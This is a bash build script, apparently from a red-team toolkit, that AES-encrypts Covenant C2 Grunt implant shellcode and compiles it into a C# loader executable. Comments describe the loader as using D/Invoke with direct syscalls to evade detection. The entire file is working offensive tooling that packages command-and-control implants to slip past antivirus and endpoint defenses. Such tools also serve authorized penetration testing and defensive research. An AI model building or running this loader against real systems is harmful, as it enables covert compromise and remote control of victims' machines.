#!/bin/bash

## Version 0.2, using D/Invoke with direct syscalls
## Use CS shellcode directly without donut 

## lhost and lport are not in use for this script, make sure arch is correct

lhost="10.0.0.189"
lport="443"
arch="x64"
c2type="covenant"

echo 'lhost: '$lhost
echo 'lport: '$lport
echo 'arch:  '$arch
echo 'c2type:'$c2type

mkdir tmp
mkdir output

### Move the GruntHTTP.bin to folder input and rename to GruntHTTP.bin, then run the autogen script.

rawscfilename='GruntHTTP.bin'
rawscfilename_enc=$rawscfilename'.enc'
raw_cs_filename_compiled='GruntHTTP.exe'


sleep 2

cp aesloader2_template.txt tmp/aesloadermono_covenant.cs

mono-csc -out:encryptor.exe -platform:x64 encryptor.cs

mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt

encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/aesloadermono_covenant.cs
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/aesloadermono_covenant.cs
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/aesloadermono_covenant.cs
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/aesloadermono_covenant.cs
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/aesloadermono_covenant.cs
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/aesloadermono_covenant.cs
sed -i '' -f /dev/stdin tmp/aesloadermono_covenant.cs << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

if [ $arch = 'x64' ]
then
    mono-csc -out:output/aesloadermono_cov_x64.exe -platform:x64 -unsafe tmp/aesloadermono_covenant.cs
fi

if [ $arch = 'x86' ]
then
    mono-csc -out:output/aesloadermono_cov_x86.exe -platform:x86 -unsafe tmp/aesloadermono_covenant.cs
fi
